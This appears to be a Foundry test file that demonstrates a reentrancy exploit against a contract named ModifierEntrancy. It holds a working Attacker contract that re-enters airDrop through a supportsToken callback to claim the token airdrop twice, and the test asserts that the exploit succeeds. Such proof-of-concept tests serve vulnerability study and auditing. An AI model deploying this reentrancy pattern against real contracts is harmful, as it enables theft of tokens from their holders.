
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required for this vulnerability as it relies on initial 0 balance.

        // --- 3. Funding ---
        // Not strictly necessary for this token logic, but following template structure.
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = victim.tokenBalance(address(this));

        // 3. Call the vulnerable function.
        victim.airDrop();

        // 4. Verify Success Conditions.
        // If reentrancy worked, we should have been credited twice (20 + 20 = 40).
        // Normal behavior would be 20.
        if (victim.tokenBalance(address(this)) > 20) {
            exploitSucceeded = true;
        }
    }

    // The vulnerable contract calls this function via the 'supportsToken' modifier.
    // This acts as the reentrancy hook instead of receive().
    function supportsToken() external returns(bytes32){
        if(attackCallCount < 2){
            attackCallCount++;
            victim.airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }

    receive() external payable {}
}
